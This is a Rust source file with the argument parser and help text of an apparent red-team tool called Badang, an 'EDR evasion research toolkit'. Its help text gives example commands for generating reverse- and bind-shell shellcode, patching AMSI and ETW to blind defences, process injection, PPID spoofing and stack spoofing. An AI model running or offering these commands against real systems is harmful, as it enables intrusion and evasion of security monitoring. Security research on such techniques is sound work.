// Badang — CLI argument parsing
use std::env;
use std::process;

// `CLI` is a well-established acronym (Command Line Interface).
#[allow(clippy::upper_case_acronyms)]
pub struct CLI {
    pub command: String,
    pub dry_run: bool,
    pub verbose: bool,
    pub confirm: bool,
    pub target_pid: u32,
    pub inject_technique: String,
    pub payload: String,
    pub syscall_func: String,
    pub unhook_func: String,
    pub convert_input: String,
    pub convert_output: String,
    pub convert_format: String,
    pub generate_type: String,
    pub generate_command: String,
    pub generate_title: String,
    pub generate_text: String,
    pub generate_lhost: String,
    pub generate_lport: u16,
    pub scan_filter: String,
    pub etw_target: String,
    pub amsi_target: String,
    pub encrypt_method: String,
    pub encrypt_key: String,
    pub ppid_parent: String,
    pub ppid_child: String,
    pub ppid_suspended: bool,
    pub indirect: bool,
    pub sleep_method: String,
    pub sleep_duration: u32,
    pub spoof_func: String,
}

impl CLI {
    pub fn parse() -> Self {
        let args: Vec<String> = env::args().collect();

        let mut cli = CLI {
            command: String::from("help"),
            dry_run: true,
            verbose: false,
            confirm: false,
            target_pid: 0,
            inject_technique: String::from("createremote"),
            payload: String::from("shellcode.bin"),
            syscall_func: String::from("NtAllocateVirtualMemory"),
            unhook_func: String::from("NtCreateThreadEx"),
            convert_input: String::new(),
            convert_output: String::from("payload.bin"),
            convert_format: String::from("auto"),
            generate_type: String::new(),
            generate_command: String::from("calc.exe"),
            generate_title: String::from("Badang"),
            generate_text: String::from("Hello from Badang"),
            generate_lhost: String::from("127.0.0.1"),
            generate_lport: 4444,
            scan_filter: String::new(),
            etw_target: String::from("EtwEventWrite"),
            amsi_target: String::from("AmsiScanBuffer"),
            encrypt_method: String::from("xor"),
            encrypt_key: String::new(),
            ppid_parent: String::new(),
            ppid_child: String::from("notepad.exe"),
            ppid_suspended: false,
            indirect: false,
            sleep_method: String::from("manual"),
            sleep_duration: 3000,
            spoof_func: String::from("NtAllocateVirtualMemory"),
        };

        let mut i = 1;
        while i < args.len() {
            match args[i].as_str() {
                "--help" | "-h" => {
                    print_help();
                    process::exit(0);
                }
                "--verbose" | "-v" => cli.verbose = true,
                "--dry-run" | "-n" => cli.dry_run = true,
                "--execute" | "-x" => cli.dry_run = false,
                "--confirm" | "-c" => cli.confirm = true,
                "--pid" | "-p" => {
                    i += 1;
                    if i < args.len() {
                        cli.target_pid = args[i].parse().unwrap_or_else(|_| {
                            eprintln!("Invalid PID: {}", args[i]);
                            process::exit(1);
                        });
                    }
                }
                "--technique" | "-t" => {
                    i += 1;
                    if i < args.len() {
                        cli.inject_technique = args[i].clone();
                    }
                }
                "--syscall" | "-s" | "--func" => {
                    i += 1;
                    if i < args.len() {
                        cli.syscall_func = args[i].clone();
                    }
                }
                "--unhook" | "-u" => {
                    i += 1;
                    if i < args.len() {
                        cli.unhook_func = args[i].clone();
                    }
                }
                "--payload" | "-l" => {
                    i += 1;
                    if i < args.len() {
                        cli.payload = args[i].clone();
                    }
                }
                "--input" | "-i" => {
                    i += 1;
                    if i < args.len() {
                        cli.convert_input = args[i].clone();
                    }
                }
                "--output" | "-o" => {
                    i += 1;
                    if i < args.len() {
                        cli.convert_output = args[i].clone();
                    }
                }
                "--format" | "-f" => {
                    i += 1;
                    if i < args.len() {
                        cli.convert_format = args[i].clone();
                    }
                }
                "analyze" => cli.command = String::from("analyze"),
                "syscall" => cli.command = String::from("syscall"),
                "inject" => cli.command = String::from("inject"),
                "load" => cli.command = String::from("load"),
                "convert" => cli.command = String::from("convert"),
                "generate" => cli.command = String::from("generate"),
                "scan" => cli.command = String::from("scan"),
                "unhook" => cli.command = String::from("unhook"),
                "etw" => cli.command = String::from("etw"),
                "amsi" => cli.command = String::from("amsi"),
                "encrypt" => cli.command = String::from("encrypt"),
                "ppid" => cli.command = String::from("ppid"),
                "sleep" => cli.command = String::from("sleep"),
                "spoof" => cli.command = String::from("spoof"),
                "--parent" => {
                    i += 1;
                    if i < args.len() {
                        cli.ppid_parent = args[i].clone();
                    }
                }
                "--parent-pid" => {
                    i += 1;
                    if i < args.len() {
                        cli.ppid_parent = args[i].clone();
                    }
                }
                "--child" => {
                    i += 1;
                    if i < args.len() {
                        cli.ppid_child = args[i].clone();
                    }
                }
                "--suspended" => cli.ppid_suspended = true,
                "--indirect" => cli.indirect = true,
                "--duration" => {
                    i += 1;
                    if i < args.len() {
                        cli.sleep_duration = args[i].parse().unwrap_or_else(|_| {
                            eprintln!("Invalid duration: {}", args[i]);
                            process::exit(1);
                        });
                    }
                }
                "--demo" => {
                    i += 1;
                    if i < args.len() {
                        cli.spoof_func = args[i].clone();
                    }
                }
                "--method" => {
                    i += 1;
                    if i < args.len() {
                        cli.encrypt_method = args[i].clone();
                        cli.sleep_method = args[i].clone();
                    }
                }
                "--key" => {
                    i += 1;
                    if i < args.len() {
                        cli.encrypt_key = args[i].clone();
                    }
                }
                "--patch" => {
                    i += 1;
                    if i < args.len() {
                        let val = args[i].clone();
                        if cli.command == "amsi" {
                            cli.amsi_target = val;
                        } else {
                            cli.etw_target = val;
                        }
                    }
                }
                "--filter" => {
                    i += 1;
                    if i < args.len() {
                        cli.scan_filter = args[i].clone();
                    }
                }
                "--type" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_type = args[i].clone();
                    }
                }
                "--command" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_command = args[i].clone();
                    }
                }
                "--title" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_title = args[i].clone();
                    }
                }
                "--text" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_text = args[i].clone();
                    }
                }
                "--lhost" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_lhost = args[i].clone();
                    }
                }
                "--lport" => {
                    i += 1;
                    if i < args.len() {
                        cli.generate_lport = args[i].parse().unwrap_or_else(|_| {
                            eprintln!("Invalid port: {}", args[i]);
                            process::exit(1);
                        });
                    }
                }
                _ => {
                    eprintln!("Unknown argument: {}", args[i]);
                    print_help();
                    process::exit(1);
                }
            }
            i += 1;
        }

        // PID is required for process-targeting commands
        if (cli.command == "analyze" || cli.command == "inject") && cli.target_pid == 0 {
            eprintln!(
                "ERROR: --pid <PID> is required for {} command.",
                cli.command
            );
            eprintln!("Use --dry-run (default) to simulate without executing.");
            process::exit(1);
        }

        // Type is required for generate command
        if cli.command == "generate" && cli.generate_type.is_empty() {
            eprintln!("ERROR: --type is required for generate command.");
            eprintln!("Types: nop, exec, messagebox, reverse_tcp, bind_tcp");
            process::exit(1);
        }

        // Payload file is required for the load command
        if cli.command == "load" && cli.payload.is_empty() {
            eprintln!("ERROR: --payload <PATH> is required for the load command.");
            process::exit(1);
        }

        cli
    }
}

fn print_help() {
    println!("Badang v0.2.0 — EDR Evasion Research Toolkit");
    println!();
    println!("USAGE: badang <command> [options]");
    println!();
    println!("COMMANDS:");
    println!("  analyze    Analyze hooked APIs in a target process");
    println!("  syscall    Direct/indirect syscall invocation (bypass user-mode hooks)");
    println!("  inject     Process injection technique demonstration");
    println!("  load       Load and verify a shellcode payload file (no execution)");
    println!("  convert    Convert shellcode between formats (hex/C/Python/Rust/decimal)");
    println!("  generate   Generate shellcode payload (built-in, no msfvenom needed)");
    println!("  scan       List running processes (pick a target PID)");
    println!("  unhook     API unhooking (restore original function bytes)");
    println!("  etw        ETW patching (blind EDR telemetry by patching EtwEventWrite)");
    println!("  amsi       AMSI bypass (patch AmsiScanBuffer to skip scans)");
    println!("  encrypt    Encrypt shellcode with XOR/RC4 (adds decryption stub)");
    println!("  ppid       PPID spoofing (spawn process with fake parent)");
    println!("  sleep      Sleep obfuscation (encrypt memory during sleep)");
    println!("  spoof      Stack spoofing (fake call stack frames)");
    println!();
    println!("OPTIONS:");
    println!("  -p, --pid <PID>       Target process ID (required)");
    println!("  -s, --syscall <FUNC>  Target syscall function (syscall command)");
    println!("  -f, --func <FUNC>     Target function name (alias for --syscall)");
    println!("  -t, --technique <TEC> Injection technique (inject command)");
    println!("  -l, --payload <PATH>  Shellcode payload file (load command, live inject)");
    println!("  -u, --unhook <FUNC>   Target API to unhook (unhook command)");
    println!("  -i, --input <TEXT>    Shellcode bytes to convert (convert command)");
    println!("  -o, --output <PATH>   Output .bin file (convert command, default: payload.bin)");
    println!(
        "      --format <FMT>    Input format: auto/hex/c/python/rust/decimal (default: auto)"
    );
    println!("  -n, --dry-run         Simulate without executing (default)");
    println!("  -x, --execute         Actually perform the operation");
    println!("  -c, --confirm         Confirm before executing");
    println!("      --filter <NAME>   Filter processes by name (scan command)");
    println!("      --patch <FUNC>    Target function to patch (etw/amsi commands)");
    println!("  -v, --verbose         Verbose output");
    println!();
    println!("GENERATE OPTIONS:");
    println!("  --type <TYPE>         Payload type: nop, exec, messagebox, reverse_tcp, bind_tcp");
    println!("  --command <CMD>       Command to execute (exec type, default: calc.exe)");
    println!("  --title <TEXT>        MessageBox title (messagebox type)");
    println!("  --text <TEXT>         MessageBox body text (messagebox type)");
    println!("  --lhost <IP>          Listener IP address (reverse_tcp type)");
    println!("  --lport <PORT>        Listener port (reverse_tcp/bind_tcp, default: 4444)");
    println!();
    println!("GENERATE EXAMPLES:");
    println!("  badang-cli generate --type exec --command \"calc.exe\" -o payload.bin");
    println!(
        "  badang-cli generate --type messagebox --title \"Pwned\" --text \"Hello\" -o msg.bin"
    );
    println!(
        "  badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin"
    );
    println!("  badang-cli generate --type bind_tcp --lport 4444 -o bind.bin");
    println!();
    println!("CONVERT EXAMPLES:");
    println!("  badang-cli convert -i \"fc 48 83 e4 f0\" -o payload.bin");
    println!("  badang-cli convert -i \"\\xfc\\x48\\x83\" -o payload.bin");
    println!("  badang-cli convert -i \"{{0xfc, 0x48}}\" --format c -o payload.bin");
    println!("  badang-cli convert --payload input.bin --format hex    (dump a .bin as hex)");
    println!();
    println!("ETW EXAMPLES:");
    println!("  badang-cli etw -x -c                                    (patch EtwEventWrite)");
    println!("  badang-cli etw --patch EtwEventWriteFull -x -c          (patch EtwEventWriteFull)");
    println!("  badang-cli etw --patch NtTraceEvent -x -c               (patch NtTraceEvent)");
    println!();
    println!("AMSI EXAMPLES:");
    println!("  badang-cli amsi -x -c                                   (patch AmsiScanBuffer)");
    println!("  badang-cli amsi --patch AmsiScanString -x -c            (patch AmsiScanString)");
    println!();
    println!("ENCRYPT OPTIONS:");
    println!("  --method <METHOD>     Encryption method: xor, xormulti, rc4 (default: xor)");
    println!("  --key <KEY>           Encryption key (required)");
    println!();
    println!("ENCRYPT EXAMPLES:");
    println!(
        "  badang-cli encrypt --payload rev.bin --method xor --key A -o encrypted.bin"
    );
    println!(
        "  badang-cli encrypt --payload rev.bin --method rc4 --key \"secretkey\" -o encrypted.bin"
    );
    println!();
    println!("SYSCALL OPTIONS:");
    println!("  --indirect            Use indirect syscall (Hell's Gate / Halo's Gate)");
    println!();
    println!("SYSCALL EXAMPLES:");
    println!("  badang-cli syscall --syscall NtAllocateVirtualMemory -x -c");
    println!("  badang-cli syscall --syscall NtCreateThreadEx --indirect -x -c");
    println!();
    println!("PPID OPTIONS:");
    println!("  --parent <NAME>       Parent process name (e.g., explorer.exe)");
    println!("  --parent-pid <PID>    Parent process PID (alternative to --parent)");
    println!("  --child <CMD>         Child command to spawn (default: notepad.exe)");
    println!("  --suspended           Create child suspended (for APC injection)");
    println!();
    println!("PPID EXAMPLES:");
    println!("  badang-cli ppid --parent explorer.exe --child notepad.exe -x -c");
    println!("  badang-cli ppid --parent-pid 1234 --child cmd.exe --suspended -x -c");
    println!();
    println!("SLEEP OPTIONS:");
    println!("  --method <METHOD>     Sleep method: manual, ekko (default: manual)");
    println!("  --duration <MS>       Sleep duration in ms (default: 3000)");
    println!();
    println!("SLEEP EXAMPLES:");
    println!("  badang-cli sleep --method manual --duration 5000 -x -c");
    println!("  badang-cli sleep --method ekko --duration 3000 -x -c");
    println!();
    println!("SPOOF OPTIONS:");
    println!("  --demo <FUNC>         Target function for stack spoof demo");
    println!();
    println!("SPOOF EXAMPLES:");
    println!("  badang-cli spoof --demo NtAllocateVirtualMemory -x -c");
    println!("  badang-cli spoof --demo NtCreateThreadEx -x -c");
    println!();
    println!("WARNING: For authorized security research only.");
    println!("Using without authorization is illegal.");
}
